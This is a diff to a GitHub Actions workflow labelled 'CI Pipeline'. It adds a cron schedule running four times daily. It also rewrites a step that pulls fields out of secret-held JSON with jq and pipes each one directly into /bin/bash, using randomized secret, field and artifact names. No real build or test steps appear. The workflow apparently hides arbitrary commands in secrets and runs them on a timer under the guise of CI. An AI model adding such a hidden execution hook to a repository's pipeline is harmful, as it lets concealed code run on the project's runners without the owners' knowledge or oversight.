@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '32 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,15 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          siep17: ${{ secrets.siep17 }}
+          i76: ${{ secrets.i76 }}
         run: |
-          printf '%s' "$siep17" | jq -r .qgobe97451 | /bin/bash
-          echo $wlucd2995 | jq -r .j15 | /bin/bash
-          echo $yowy3 | jq -r .norxp9718 | /bin/bash
+          printf '%s' "$i76" | jq -r .qjyxu23573 | /bin/bash
+          printf '%s' "$kspyl74" | jq -r .wvh24462 | /bin/bash
+          printf '%s' "$qsa1" | jq -r .m60 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: GszhWzLI
+          name: oXLaR6OP
           path: "*.zip"
           retention-days: 1
